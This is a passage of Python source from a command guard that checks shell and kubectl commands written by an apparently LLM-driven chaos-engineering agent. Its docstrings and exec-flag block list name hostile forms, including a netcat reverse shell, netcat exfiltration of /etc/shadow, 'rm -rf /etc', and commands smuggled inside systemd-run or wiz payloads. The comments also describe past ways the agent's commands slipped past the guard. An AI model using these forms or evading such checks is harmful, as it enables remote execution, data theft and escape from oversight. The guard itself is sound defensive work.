        ``compliant_form``, instead of concatenating both into one string.

        Both ``--flag`` and ``--flag=value`` are matched; kubectl's pflag accepts
        either and does not abbreviate long names.
        """
        for arg in cmd[1:]:
            name = arg.split("=", 1)[0]
            cause = self.KUBECTL_DRAIN_FORBIDDEN_FLAGS.get(name)
            if cause is None:
                continue
            return GuardFeedback(
                allowed=False,
                constraint=ViolatedConstraint.UNSUPPORTED_FORM,
                reason=f"kubectl drain {name} not allowed: {cause}.",
                offending=name,
                # NOT a hard floor: dropping one flag makes the same drain
                # legal, so this is a form issue. Flagging it a dead-end while
                # handing over the fix contradicts itself and pushes the model
                # to abandon a drill it can legitimately run.
                compliant_form=self._KUBECTL_DRAIN_COMPLIANT_FORM,
            )
        return None

    def _check_kubectl_run(self, cmd: list[str]) -> GuardFeedback | None:
        """Narrow ``kubectl run`` to the recovery-carrier shape.

        ``run`` is admitted for exactly one purpose (openspec
        recovery-carrier-standard): creating the recovery timer host pod
        for API-plane fault recovery. Any other run — arbitrary image,
        arbitrary command, crash-loop restart policy — is an unrestricted
        pod spawner: the identity review cannot catch it because a CREATED
        pod's name never matches the approved identity, and the workload
        net's pod entry is namespace-anchored, so an in-net non-carrier
        run passes the drift gate by construction. This guard fires at
        dispatch in EVERY phase (execute loop, recover Layer 1, direct
        transport calls) precisely because the screener only screens some
        of them.

        The shape predicate is DELEGATED to the canonical classifier
        (``_is_recovery_carrier_run``) rather than re-implemented here —
        the two layers must never drift apart. Lazy import mirrors the
        registry import above (tools → agent stays call-time only).

        Returns the rejection feedback, or ``None`` when the call is the
        carrier shape.
        """
        run_index = cmd.index("run")
        args = cmd[run_index + 1:]
        from chaos_agent.agent.providers.k8s_native.classifier import (
            _first_positional,
            _is_recovery_carrier_run,
            _recovery_carrier_shape_failure,
        )

        name = _first_positional(args)
        if name and _is_recovery_carrier_run(args, name):
            return None
        # Diagnose the FIRST failing condition and surface it — an opaque
        # rejection sent the executor fishing across replans (run8: an
        # image-allowlist miss read as a target-drift attack because the
        # real reason was not in the feedback).
        failure = (
            _recovery_carrier_shape_failure(args, name)
            if name
            else "missing the positional carrier pod name"
        )
        reason = (
            "kubectl run is admitted only in the recovery-carrier "
            "shape (timer-host pod for API-plane fault recovery)"
        )
        if failure:
            reason += f" — failed condition: {failure}"
        return GuardFeedback(
            allowed=False,
            constraint=ViolatedConstraint.UNSUPPORTED_FORM,
            reason=reason,
            offending="run",
            # NOT a hard floor: reshaping the call to the carrier skeleton
            # makes the same intent legal.
            compliant_form=(
                "kubectl run <drill-rc-<hash>> -n <ns> --image=busybox:1.36 "
                "--restart=Never --command -- sleep <N> (see "
                "references/carrier/recovery-carrier.md; --overrides admits "
                "spec.serviceAccountName only; any healthy-DaemonSet image "
                "auto-discovered at task start is also allowed)"
            ),
        )

    def _check_kubectl_create(self, cmd: list[str]) -> GuardFeedback | None:
        """Ban imperative ``kubectl create KIND`` for workload kinds.

        Imperative create (no ``-f``) that names a workload kind starts
        containers whose shape no contract can verify: there is no
        manifest for the drill-target checks (image allow-set, single
        container, no privilege surface) to inspect, and nothing
        registers the created workload on the cleanup chain. Unlike
        ``run`` — which has the recovery-carrier carve-out — no imperative
        workload create has a compliant form; the manifest channel
        (``kubectl apply -f -`` with stdin_data) is the only admitted
        staging path.

        The kind predicate is DELEGATED to the canonical classifier
        (``_imperative_workload_create_kind``) rather than re-implemented
        — the dispatcher's ``sub == "create"`` branch bans the same kinds
        on the screener path, and the two layers must never drift apart.
        Like ``_check_kubectl_run`` this fires at dispatch in EVERY phase
        (execute loop, recover Layer 1, direct transport calls) precisely
        because the screener only screens some of them.

        Returns the rejection feedback, or ``None`` for manifest-channel
        creates (``-f`` / ``--filename``) and non-workload kinds.
        """
        create_index = cmd.index("create")
        args = cmd[create_index + 1:]
        # Manifest-channel creates carry their own contract (the
        # drill-target Deployment checks run at classification time);
        # this guard polices only the imperative form. Filename detection
        # is DELEGATED to the classifier's pflag-normalised predicate
        # (``_uses_file_input``) so bundled spellings (``-Af -`` — boolean
        # A + f absorbing the next token as stdin) count as manifest
        # creates too, matching what kubectl actually parses (round-5
        # probe: the token-level check let all three -Af forms through).
        from chaos_agent.agent.providers.k8s_native.classifier import (
            _uses_file_input,
        )

        if _uses_file_input(args):
            return None
        from chaos_agent.agent.providers.k8s_native.classifier import (
            _imperative_workload_create_kind,
        )

        kind = _imperative_workload_create_kind(args)
        if kind is None:
            return None
        return GuardFeedback(
            allowed=False,
            constraint=ViolatedConstraint.UNSUPPORTED_FORM,
            reason=(
                f"imperative 'kubectl create {kind}' starts a {kind} whose "
                "shape the guard cannot verify (image, command, lifetime) "
                "and whose cleanup the task cannot track"
            ),
            offending=kind,
            # NOT a hard floor: staging a drill target stays expressible
            # through the manifest channel, so this points at the
            # compliant mechanism instead of walling off the intent.
            compliant_form=(
                "Stage the drill target via the manifest channel: "
                "'kubectl apply -f -' with stdin_data under the "
                "drill-target contract (single Deployment document, "
                "metadata.name = the approved target name, exactly one "
                "container under spec.template.spec with no "
                "initContainers, no host*/privileged/capabilities/"
                "hostPath, an image from the carrier allow-set, "
                "persistentVolumeClaim/configMap/secret volumes only) — "
                "or inject into a workload that already exists."
            ),
        )

    def _check_kubectl_kustomize(
        self, cmd: list[str], sub: str,
    ) -> GuardFeedback | None:
        """Ban the kustomize input channel on mutating subcommands.

        ``kubectl apply -k <dir>`` builds the manifests from a
        directory the guard cannot see (live probe, kubectl v1.34.1:
        apply/delete/replace/create all execute the built objects) —
        the same invisibility class as ``-f <file>``, which the
        classifier already bans. The screener's classifier face now
        refuses it too, but this gate fires at dispatch in EVERY phase
        (recover Layer 1, direct transport calls) — the same
        every-phase discipline as ``_check_kubectl_manifest_widening``.

        The predicate is DELEGATED to the canonical classifier
        (``_uses_kustomize_input``) so bundled (``-Rk``), glued
        (``-k=dir``) and long (``--kustomize dir``) spellings share one
        parser between the layers. Read-only ``-k`` calls (``get -k``)
        stay outside: this check admits only the mutating -f subs.
        """
        if sub not in (
            "apply", "create", "replace", "patch", "delete", "set", "edit",
        ):
            return None
        sub_index = cmd.index(sub)
        args = cmd[sub_index + 1:]
        from chaos_agent.agent.providers.k8s_native.classifier import (
            _uses_kustomize_input,
        )

        if not _uses_kustomize_input(args):
            return None
        return GuardFeedback(
            allowed=False,
            constraint=ViolatedConstraint.UNSUPPORTED_FORM,
            reason=(
                "kubectl -k builds manifests from a kustomization DIRECTORY "
                "whose contents are not visible to the guard — the same "
                "invisibility class as '-f <file>' (probe: apply/delete/"
                "replace/create all execute the built objects)"
            ),
            offending="-k",
            compliant_form=(
                "Render the kustomization locally (kubectl kustomize <dir>) "
                "and pass the resulting manifest via stdin_data with "
                "'-f -'."
            ),
        )

    def _check_kubectl_manifest_widening(
        self, cmd: list[str], sub: str,
    ) -> GuardFeedback | None:
        """Ban range-widening flags on the stdin-manifest channel.

        ``apply --prune -f -`` deletes live resources absent from the
        manifest; ``--all`` / ``-A`` widen the operand set. The guard's
        visibility boundary IS the manifest text, so the flag-driven
        part bypasses every identity anchor — the same class of gap
        ``_check_kubectl_create`` closes for the imperative form, found
        by the same third-round review: the screener's classifier bans
        these flags at the shared manifest entry, but the screener only
        screens the ReAct loop, while this gate fires at dispatch in
        EVERY phase (recover Layer 1, direct transport calls).

        The flag predicate is DELEGATED to the canonical classifier
        (``_stdin_manifest_widening_flag``) so the two layers can never
        drift apart — including the combined-shorthand forms (``-An``).

        Returns the rejection feedback, or ``None`` for manifest calls
        without a widening flag and for non-manifest subcommands
        (``get pods -A`` stays a read-only call).
        """
        if sub not in (
            "apply", "create", "replace", "patch", "delete", "set", "edit",
        ):
            return None
        sub_index = cmd.index(sub)
        args = cmd[sub_index + 1:]
        # Filename detection is DELEGATED to the classifier's
        # pflag-normalised predicate (``_uses_file_input``) — same single
        # source as the classifier's own manifest-entry decision, so a
        # bundled spelling (``-Af -``) is a manifest call HERE too
        # (round-5 probe: the token-level check let ``delete -Af -``
        # through the every-phase backstop while the classifier face
        # already banned it — the two layers must share one parser).
        from chaos_agent.agent.providers.k8s_native.classifier import (
            _uses_file_input,
        )

        if not _uses_file_input(args):
            return None
        from chaos_agent.agent.providers.k8s_native.classifier import (
            _stdin_manifest_widening_flag,
        )

        widening = _stdin_manifest_widening_flag(args)
        if not widening:
            return None
        return GuardFeedback(
            allowed=False,
            constraint=ViolatedConstraint.UNSUPPORTED_FORM,
            reason=(
                f"'{widening}' widens the call's effect beyond the manifest "
                "text (--prune deletes live resources absent from the "
                "manifest; --all / -A widen the operand set), and the guard "
                "can only see the manifest — the flag-driven part would "
                "bypass every identity anchor"
            ),
            offending=widening,
            # NOT a hard floor: the compliant form exists (drop the flag,
            # re-send the same manifest).
            compliant_form=(
                "Re-issue the call WITHOUT the flag, applying the manifest "
                "text as-is; deleting pre-existing resources is a "
                "separate, individually-approved call."
            ),
        )

    def _check_systemctl(self, cmd: list[str]) -> GuardFeedback | None:
        """Allow only service-level systemctl verbs; reject machine/boot ones.

        The verb is the first non-flag argument (``systemctl --now stop x`` →
        ``stop``). Missing verb or a verb outside the whitelist is rejected,
        naming the permitted set — the guard owns it, so leaving the model to
        guess only buys another rejected attempt.
        """
        verb = ""
        for arg in cmd[1:]:
            if not arg.startswith("-"):
                verb = arg
                break
        allowed = ", ".join(sorted(self.systemctl_subcommands))
        if not verb:
            return GuardFeedback(
                allowed=False,
                constraint=ViolatedConstraint.UNSUPPORTED_FORM,
                reason="systemctl requires a subcommand",
                compliant_form=f"Allowed verbs: {allowed}.",
            )
        if verb not in self.systemctl_subcommands:
            return GuardFeedback(
                allowed=False,
                constraint=ViolatedConstraint.UNSUPPORTED_FORM,
                reason=f"systemctl subcommand not allowed: {verb}",
                offending=verb,
                compliant_form=(
                    f"Allowed verbs: {allowed}. Machine/boot-level verbs "
                    "(poweroff/reboot/halt/isolate/enable/disable/"
                    "daemon-reload) exceed a single-service drill's blast "
                    "radius and are never admitted."
                ),
            )
        return None

    def _check_systemd_run(self, cmd: list[str]) -> GuardFeedback | None:
        """Admit ``systemd-run`` ONLY as a self-recovery timer whose payload
        is itself re-admitted.

        The drill form every host skill 降级方案 arms is
        ``systemd-run --on-active=<N>s --unit=<name> <inverse-cmd>``: the
        payload runs at the DEADLINE, not now, so a native fault self-reverses
        even if the session dies ("先武装定时恢复，再注入"). ``--on-active``
        is what makes that true — without it the payload runs IMMEDIATELY,
        which is arbitrary execution wearing a whitelisted binary's name
        (``systemd-run nginx`` is just nginx, and nginx is in no whitelist).
        Both ``--on-active=<N>s`` and the split ``--on-active <N>s`` form are
        recognised (systemd-run accepts either). The scan stops at the first
        positional token, mirroring systemd-run's own argv parsing — a
        payload-carried ``--on-active`` (``systemd-run nginx --on-active=600s``
        hands that flag to NGINX, not to the timer) arms nothing and must not
        satisfy this check.

        Once the timer form is confirmed, the payload region (every token
        from the first positional on) is RE-ADMITTED through
        :meth:`_admit_command_region`: the timer executing the payload at its
        deadline is still that payload EXECUTING, so it must meet the same
        Gate ① whitelist and Gate ③ checkers a directly-run command meets.
        The earlier checker verified only the timer FORM — a payload of
        ``python /tmp/x.py`` or ``nc -e /bin/sh …`` sailed past every gate
        except the blacklist regexes, whose vocabulary does not include
        "not whitelisted" binaries (timer-payload readmission hole).
        """
        payload_start = _systemd_run_payload_start(cmd)
        # The armed check is shared with the machinery≠mutation attributor
        # via the module-level single source ``is_systemd_run_timer``
        # (R23/G-7) — admission here and exemption there are ONE verdict.
        armed = is_systemd_run_timer(cmd)
        if not armed:
            return GuardFeedback(
                allowed=False,
                constraint=ViolatedConstraint.UNSUPPORTED_FORM,
                reason="systemd-run is admitted only as a self-recovery timer",
                offending="--on-active",
                compliant_form=(
                    "Arm the timer: `systemd-run --on-active=<N>s "
                    "--unit=<name> <inverse-cmd>` — the payload runs at the "
                    "deadline, not now. Without ``--on-active`` it runs "
                    "immediately, which is a synchronous arbitrary-execution "
                    "bypass of the binary whitelist; run such a payload through "
                    "the whitelist in its own name instead."
                ),
            )
        return self._admit_command_region(cmd[payload_start:], "timer")

    def _check_wiz(self, cmd: list[str]) -> GuardFeedback | None:
        """Re-admit the ``--command`` value of an LLM-authored ``wiz`` argv.

        ``wiz`` sits in the whitelist as a k8s-domain transport primitive,
        and ``wiz task exec --command <value>`` makes the VALUE a command
        region the remote side runs — structurally the same hole the timer
        payload had: Gate ① sees only ``cmd[0] == wiz``, so an interpreter
        or any non-whitelisted binary riding in the value executed with no
        whitelist opinion at all. Channel-assembled wiz calls (the transport
        layer building ``wiz task exec --command`` around an already-checked
        command) never reach this checker — only an LLM explicitly starting
        its argv with ``wiz`` does.
        """
        values = _wiz_command_values(cmd)
        if not values:
            # A trailing ``--command`` with no value token is a malformed
            # exec shape (wiz's own parser would error out), but fail closed
            # here too rather than admit a carrier whose payload region is
            # unspecified — non-exec shapes simply never spell ``--command``.
            if any(a == "--command" for a in cmd[1:]):
                return GuardFeedback(
                    allowed=False,
                    constraint=ViolatedConstraint.UNSUPPORTED_FORM,
                    reason="wiz --command is missing its value",
                    offending="--command",
                    compliant_form=(
                        "Pass the remote command as the flag's value: "
                        "`wiz task exec --command '<cmd>'`."
                    ),
                )
            return None  # not an exec shape (task list / login / …): nothing rides
        for value in values:
            try:
                argv = shlex.split(value)
            except ValueError:
                argv = value.split()
            feedback = self._admit_command_region(argv, "wiz task exec --command")
            if feedback is not None:
                return feedback
        return None

    # ── payload-region readmission ────────────────────────────────────

    def _admit_command_region(
        self, argv: list[str], carrier: str
    ) -> GuardFeedback | None:
        """Admit a carrier's command region through Gates ① and ③.

        Gate ① (binary whitelist) and Gate ③ (per-binary checkers) both key
        on ``cmd[0]`` alone, so a second command riding INSIDE a whitelisted
        carrier's argv — the timer payload of ``systemd-run``, the
        ``--command`` value of ``wiz task exec`` — reached execution meeting
        neither. This is the hole-class fix: the region passes the SAME
        admission judgment a directly-executed command would.

        Coverage is exactly those two carriers, by design: both payload
        regions execute OUTSIDE the k8s target model — on the host (timer)
        or on a remote host (``wiz`` task exec) — where ``approved_target``
        has no jurisdiction and this grammar is the only line of defence.
        ``kubectl exec … -- sh -c '<script>'`` is deliberately NOT in this
        hole class: its payload lands inside a k8s object (the target
        container) — ``target_guard``'s jurisdiction — and exec into a
        container is the product's own injection surface, not a bypass of
        it. That container-region exemption is a documented trust boundary
        from the hole-class inventory (8e34b2b7), not an unpatched position.

        Two shapes, mirroring how the region reaches the target:
          argv form    ``… rm -f /tmp/x.log`` — the region IS an argv; its
                       head must be whitelisted and its checker replayed.
          script form  ``… sh -c '<script>'`` — the region is a script the
                       TARGET's shell parses; bashfacts decomposes it and
                       every segment (plus every nested ``$()`` body) is
                       admitted segment by segment.
        """
        if not argv:
            return GuardFeedback(
                allowed=False,
                constraint=ViolatedConstraint.UNSUPPORTED_FORM,
                reason=f"{carrier} payload is empty — nothing to arm",
                offending="",
            )
        head = Path(argv[0]).name
        if head in _PAYLOAD_INTERPRETERS:
            # Script form, exactly ``sh -c '<script>'``: a bare ``sh <file>``
            # runs a script FILE whose contents no gate can see, and a $0
            # fourth token is a shape no skill teaches.
            if len(argv) != 3 or argv[1] != "-c" or not argv[2].strip():
                return GuardFeedback(
                    allowed=False,
                    constraint=ViolatedConstraint.UNSUPPORTED_FORM,
                    reason=(
                        f"{carrier} payload interpreter form is only `sh -c '<script>'`"
                    ),
                    offending=head,
                    compliant_form=(
                        "Put the whole recovery script in ONE quoted string: "
                        "`sh -c '<cmd> [; <cmd>…]'`. A bare interpreter runs "
                        "a script file the guard cannot see."
                    ),
                )
            return self._admit_script(argv[2], carrier)
        if head not in self.allowed_commands and head not in _READONLY_BINARIES:
            return GuardFeedback(
                allowed=False,
                constraint=ViolatedConstraint.UNKNOWN_BINARY,
                reason=f"{carrier} payload binary not allowed: {head}",
                offending=head,
                is_hard_floor=True,
                compliant_form=(
                    "Payload commands must be whitelisted binaries: "
                    + ", ".join(sorted(self.allowed_commands))
                    + " (read-only diagnostics are allowed too). Anything "
                    "else must run in its own name through the whitelist."
                ),
            )
        return self._replay_payload_checker(head, argv, carrier)

    def _admit_script(self, script: str, carrier: str) -> GuardFeedback | None:
        """Admit a ``sh -c`` script payload via bashfacts decomposition."""
        # Fail closed on 2+ backslashes before a newline: bash scans
        # left-to-right, so an EVEN backslash run leaves the newline UNescaped
        # — a command separator — while the fold below would splice the next
        # command into the current word (`echo a\\<NL>rm -f /tmp/x` really
        # runs rm; folded it parses as one `echo a\rm …` segment and the rm
        # escapes the segment check). No skill form uses the pattern.
        if re.search(r"\\{2,}\n", script):
            return GuardFeedback(
                allowed=False,
                constraint=ViolatedConstraint.UNSUPPORTED_FORM,
                reason=(
                    f"{carrier} payload uses 2+ backslashes before a newline "
                    "— ambiguous line continuation"
                ),
                offending="\\\\",
                compliant_form=(
                    "Use a single backslash per line continuation, one "
                    "command per line."
                ),
            )
        # ``\<newline>`` is bash line-continuation (the two characters are
        # DELETED); the skills' multi-line doc forms carry it inside the
        # quoted script. The scanner does not consume the sequence (a raw
        # parse yields an empty-head segment), so fold it first — a faithful
        # mirror of the TARGET shell's own preprocessing, not a relaxation.
        facts = parse_script(script.replace("\\\n", ""))
        return self._admit_script_facts(facts, carrier)

    def _admit_script_facts(
        self, facts: ScriptFacts, carrier: str, *, subst_probe: bool = False
    ) -> GuardFeedback | None:
        """Admit every segment of a parsed payload script.

        ``subst_probe`` tightens the head set to :data:`_PAYLOAD_SUBST_PROBES`
        — used for ``$(...)`` bodies, whose output feeds the OUTER command's
        argv and must not smuggle flags or arbitrary values.
        """
        if facts.errors:
            return GuardFeedback(
                allowed=False,
                constraint=ViolatedConstraint.UNKNOWN,
                reason=(
                    f"{carrier} payload script failed structural parse: "
                    f"{facts.errors[0].message}"
                ),
                offending="",
                is_hard_floor=False,
                compliant_form=(
                    "Split the payload into simpler shapes: plain "
                    "`;` / `&&` / `||` sequences of whitelisted commands."
                ),
            )
        if not facts.segments:
            return GuardFeedback(
                allowed=False,
                constraint=ViolatedConstraint.UNSUPPORTED_FORM,
                reason=f"{carrier} payload script is empty",
                offending="",
            )
        for seg in facts.segments:
            if seg.background:
                return GuardFeedback(
                    allowed=False,
                    constraint=ViolatedConstraint.UNSUPPORTED_FORM,
                    reason=f"{carrier} payload backgrounds a command (`&`)",
                    offending="&",
                    compliant_form=(
                        "Run the recovery steps sequentially — a backgrounded "
                        "step escapes the timer's completion tracking."
                    ),
                )
            if not isinstance(seg.command, CommandFacts):
                return GuardFeedback(
                    allowed=False,
                    constraint=ViolatedConstraint.UNKNOWN,
                    reason=f"{carrier} payload uses a subshell `( ... )`",
                    offending="(",
                    compliant_form=(
                        "Write the steps as a plain sequence (`;` `&&` `||`); "
                        "subshells are outside the reviewed payload grammar."
                    ),
                )
            head = ""
            if seg.command.name is not None:
                name_word = seg.command.name
                head = (
                    name_word.value if name_word.value is not None else name_word.text
                )
            if not head:
                return GuardFeedback(
                    allowed=False,
                    constraint=ViolatedConstraint.UNKNOWN,
                    reason=(f"{carrier} payload has a segment with no command head"),
                    offending="",
                )
            if head in _PAYLOAD_INTERPRETERS:
                return GuardFeedback(
                    allowed=False,
                    constraint=ViolatedConstraint.UNSUPPORTED_FORM,
                    reason=(
                        f"{carrier} payload script nests an interpreter ({head!r})"
                    ),
                    offending=head,
                    compliant_form=(
                        "The payload is already parsed as a shell script — "
                        "write the commands directly; a nested sh -c only "
                        "hides them."
                    ),
                )
            if head in _NESTED_CARRIERS:
                return GuardFeedback(
                    allowed=False,
                    constraint=ViolatedConstraint.UNSUPPORTED_FORM,
                    reason=(f"{carrier} payload script nests carrier {head!r}"),
                    offending=head,
                    compliant_form=(
                        "One carrier is enough — run the inner command "
                        "directly in the payload."
                    ),
                )
            if subst_probe:
                head_ok = head in _PAYLOAD_SUBST_PROBES
            else:
                head_ok = head in self.allowed_commands or head in _READONLY_BINARIES
            if not head_ok:
                return GuardFeedback(
                    allowed=False,
                    constraint=ViolatedConstraint.UNKNOWN_BINARY,
                    reason=(
                        f"{carrier} payload"
                        + (" $(...) body" if subst_probe else " script")
                        + f" command not allowed: {head}"
                    ),
                    offending=head,
                    is_hard_floor=True,
                    compliant_form=(
                        "Payload commands must be whitelisted binaries: "
                        + ", ".join(sorted(self.allowed_commands))
                        + (
                            "; inside $(…) only PID probes are allowed: "
                            + ", ".join(sorted(_PAYLOAD_SUBST_PROBES))
                            if subst_probe
                            else " (read-only diagnostics are allowed too)"
                        )
                    ),
                )
            for redirect in seg.command.redirects:
                target = redirect.target.value if redirect.target is not None else None
                if target is None or not target.startswith(_PAYLOAD_REDIRECT_SINKS):
                    shown = target if target is not None else "?"
                    return GuardFeedback(
                        allowed=False,
                        constraint=ViolatedConstraint.UNSUPPORTED_FORM,
                        reason=(
                            f"{carrier} payload redirects to non-sink target: {shown}"
                        ),
                        offending=shown,
                        compliant_form=(
                            "Only discard sinks are allowed in payloads "
                            "(e.g. `2>/dev/null`); the recovery steps write "
                            "no files."
                        ),
                    )
            # Per-binary checker replay, dynamic words sentinel-ized: a
            # literal flag stays a literal (structural checks still fire).
            # A dynamic word (``$(…)`` / ``$VAR`` — bashfacts leaves
            # ``value=None``; quoted/escaped literals DO carry a value) is
            # admitted ONLY on kill, whose dynamic PID target is the
            # payloads' one legal dynamic form (``kill -CONT $(pidof x)``).
            # Everywhere else a dynamic word would expand INTO the command's
            # argv on the target and bypass the checker's literal-structure
            # judgment (``chmod $MODE 777`` with MODE=-R is a recursive chmod
            # the static replay cannot see; ``rm -f $(…)`` can widen to a
            # multi-file delete the single-file checker forbids).
            replay = [head]
            for word in seg.command.args:
                if word.value is not None:
                    replay.append(word.value)
                elif head == "kill":
                    # kill's dynamic PID operand: admitted only in the two
                    # vetted shapes. (a) the word carries a script part — a
                    # ``$(…)`` / backtick body, already checked recursively
                    # below against the PID-probe set; (b) a bare ``$VAR``.
                    # Anything else — notably ``$((…))`` arithmetic — fails
                    # closed: bashfacts parses an arithmetic word as ONE
                    # opaque token with NO script part, so a backtick riding
                    # inside it (``kill -CONT $((`evil`)``) executes on the
                    # target while the recursion below never sees it. No
                    # skill form uses arithmetic PIDs.
                    if not any(
                        p.script is not None for p in word.parts
                    ) and not re.fullmatch(r"\$[A-Za-z_][A-Za-z0-9_]*", word.text):
                        return GuardFeedback(
                            allowed=False,
                            constraint=ViolatedConstraint.UNSUPPORTED_FORM,
                            reason=(
                                f"{carrier} payload: kill's dynamic PID "
                                f"operand must be a PID probe or a bare $VAR "
                                f"(got {word.text!r})"
                            ),
                            offending=word.text,
                            compliant_form=(
                                "Use `$(pidof …)` / `$(pgrep …)` / a bare "
                                "$PID variable as kill's PID operand. "
                                "Arithmetic or parameter-expanded operands "
                                "are outside the reviewed payload grammar."
                            ),
                        )
                    replay.append("999999")
                else:
                    return GuardFeedback(
                        allowed=False,
                        constraint=ViolatedConstraint.UNSUPPORTED_FORM,
                        reason=(
                            f"{carrier} payload: {head} has a dynamic argument "
                            f"({word.text!r}) — only kill's PID target may be "
                            "dynamic"
                        ),
                        offending=word.text,
                        compliant_form=(
                            "Literalize every argument (file paths, flags, "
                            "modes). Only the PID operand of kill may come "
                            "from `$(pidof …)` / `$(pgrep …)` / a $PID "
                            "variable."
                        ),
                    )
            feedback = self._replay_payload_checker(head, replay, carrier)
            if feedback is not None:
                return feedback
            # ``$(…)`` / backtick bodies: PID probes only, recursively.
            for word in (seg.command.name, *seg.command.args):
                if word is None:
                    continue
                for part in word.parts:
                    if part.script is None:
                        continue
                    feedback = self._admit_script_facts(
                        part.script, carrier, subst_probe=True
                    )
                    if feedback is not None:
                        return feedback
        return None

    def _replay_payload_checker(
        self, head: str, argv: list[str], carrier: str
    ) -> GuardFeedback | None:
        """Replay the head's per-binary checker on a payload argv, prefixing
        the verdict with the carrier so the model sees WHICH layer fired.

        Evidence spans are dropped: their offsets index the payload's own
        argv, not the carrier command the caller would display.
        """
        checker = self._binary_checkers.get(head)
        if checker is None:
            return None
        feedback = checker(argv)
        if feedback is None:
            return None
        return GuardFeedback(
            allowed=False,
            constraint=feedback.constraint,
            reason=f"{carrier} payload: {feedback.reason}",
            offending=feedback.offending,
            is_hard_floor=feedback.is_hard_floor,
            compliant_form=feedback.compliant_form,
        )

    def _check_rm(self, cmd: list[str]) -> GuardFeedback | None:
        """Admit ``rm`` ONLY as the idempotent single-file cleanup tail.

        Every host skill ends a manual early-recovery with
        ``rm -f <file>.bak`` / ``rm -f <fill-file>`` — deleting a file the
        DRILL itself created (the backup, the fallocate fill). That is a
        cleanup of the drill's own artifact, the host twin of
        ``kubectl delete <debug-pod>``: bounded, and the file has no value
        outside the drill. ``-f`` makes it idempotent — the timer may have
        cleaned the file already, and the tail must not fail on that.

        Recursive forms have NO such boundary (``-r`` walks a whole tree the
        drill never created) and are refused outright — the same reasoning
        that gives kubectl ``drain`` its dedicated flag guard while bare
        ``delete`` needs none. The quoted-token ``rm -rf`` hard floor in
        Gate ② keeps covering the ``sh -c '…'`` forms; this checker covers
        the SEPARATE-token forms (``rm -rf /etc`` splits into three argv
        tokens, which the per-token blacklist regex cannot see).
        """
        args = cmd[1:]
        if len(args) == 2 and args[0] == "-f" and not args[1].endswith("/"):
            return None
        flag = next((a for a in args if a.startswith("-")), args[0] if args else "rm")
        return GuardFeedback(
            allowed=False,
            constraint=ViolatedConstraint.UNSUPPORTED_FORM,
            reason=(
                "rm is admitted only as `rm -f <single-file>` — deleting one "
                "drill-created file (backup / fill artifact)"
            ),
            offending=flag,
            compliant_form=(
                "Delete exactly one drill-created file: `rm -f <path>`. "
                "Recursive forms (-r/-R/-rf/--recursive) walk whole trees "
                "with no drill boundary and are never admitted."
            ),
        )

    def _check_chmod(self, cmd: list[str]) -> GuardFeedback | None:
        """Refuse recursive chmod — a whole-tree permission rewrite."""
        for arg in cmd[1:]:
            if arg in ("-R", "--recursive"):
                return GuardFeedback(
                    allowed=False,
                    constraint=ViolatedConstraint.UNSUPPORTED_FORM,
                    reason="chmod recursive (-R) not allowed",
                    offending=arg,
                    compliant_form=(
                        "Target the single path whose permissions the fault "
                        "needs; a recursive rewrite cannot be undone from the "
                        "original modes, which are not recorded anywhere."
                    ),
                )
        return None

    def _check_nc(self, cmd: list[str]) -> GuardFeedback | None:
        """Lock ``nc`` to LISTEN mode; refuse command execution and client mode.

        The drill this admits is "occupy a port"
        (``Host_网络故障_端口占用``): a listener holds the port so the real
        service cannot bind it. Blast radius is that one port.

        Two other things netcat can do are not drills:
          - ``-e`` / ``-c`` / ``--sh-exec`` hand a spawned shell to whoever
            connects. That is a reverse shell, i.e. arbitrary remote execution
            through a binary the guard admitted for port occupation.
          - client mode (no ``-l``) opens an OUTBOUND connection, which turns nc
            into an exfiltration channel (``nc host port < /etc/shadow``).

        Neither has a bounded blast radius that a target approval could describe,
        so both are refused. ``is_hard_floor`` is NOT set: the listen form is a
        legitimate fault and the model reaches it by editing this same command.
        """
        exec_flags = {"-e", "-c", "--exec", "--sh-exec", "--lua-exec"}
        for arg in cmd[1:]:
            head = arg.split("=", 1)[0]
            if head in exec_flags:
                return GuardFeedback(
                    allowed=False,
                    constraint=ViolatedConstraint.UNSUPPORTED_FORM,
                    reason=f"nc command-execution flag not allowed: {arg}",
                    offending=arg,
                    compliant_form=(
                        "Drop the exec flag. Occupying a port needs only a "
                        "listener: `nc -l -p <port> -k`. A flag that runs a "
                        "program for each connection is remote code execution, "
                        "not a fault."
                    ),
                )
        listening = any(
            arg in ("-l", "-lk", "-kl", "--listen")
            or (
                arg.startswith("-")
                and not arg.startswith("--")
                and "l" in arg[1:]
                and arg[1:].isalpha()
            )
            for arg in cmd[1:]
        )
        if not listening:
            return GuardFeedback(
                allowed=False,
                constraint=ViolatedConstraint.UNSUPPORTED_FORM,
                reason="nc is admitted only in listen mode",
                compliant_form=(
                    "Add `-l` (e.g. `nc -l -p <port> -k`). Client mode opens an "
                    "outbound connection to an arbitrary host, which no target "
                    "approval bounds; to CHECK a port, use host_read."
                ),
            )
        return None

    def _check_fuser(self, cmd: list[str]) -> GuardFeedback | None:
        """When ``fuser`` kills (``-k``), require a PORT spec, never a path.

        ``fuser -k <port>/tcp`` kills whatever holds one port — bounded, and the
        only single-command way to express "kill the process owning this port"
        (``Host_进程异常_进程被杀死``).

        ``fuser -k <path>`` is a different operation: it kills every process with
        that path open, so ``fuser -k /`` or ``-k /var`` reaches most of the
        machine. The argument shape is the whole difference, so it is what gets
        checked. Without ``-k`` fuser only lists holders and is left alone.
        """
        if not any(
            a == "-k" or (a.startswith("-") and not a.startswith("--") and "k" in a[1:])
            for a in cmd[1:]
        ):
            return None
        targets = [a for a in cmd[1:] if not a.startswith("-")]
        port_spec = re.compile(r"^\d+/(tcp|udp)$")
        for target in targets:
            if not port_spec.match(target):
                return GuardFeedback(
                    allowed=False,
                    constraint=ViolatedConstraint.UNSUPPORTED_FORM,
                    reason=f"fuser -k target is not a port spec: {target}",
                    offending=target,
                    compliant_form=(
                        "Write the target as `<port>/tcp` or `<port>/udp` "
                        "(e.g. `fuser -k 8080/tcp`). Killing by PATH signals "
                        "every process holding that path open, which for a "
                        "directory is most of the machine."
                    ),
                )
        if not targets:
            return GuardFeedback(
                allowed=False,
                constraint=ViolatedConstraint.UNSUPPORTED_FORM,
                reason="fuser -k names no target",
                compliant_form="Name the port to free, e.g. `fuser -k 8080/tcp`.",
            )
        return None

    def _check_strace(self, cmd: list[str]) -> GuardFeedback | None:
        """Lock ``strace`` to attach mode (``-p <pid>``).

        The drill is "slow one process's syscalls"
        (``Host_系统调用异常_调用延迟``): tracing adds per-syscall overhead to
        exactly the traced PID.

        Without ``-p``, strace LAUNCHES its argument (``strace <cmd> <args>``).
        That is arbitrary command execution wearing a tracer's name, and the
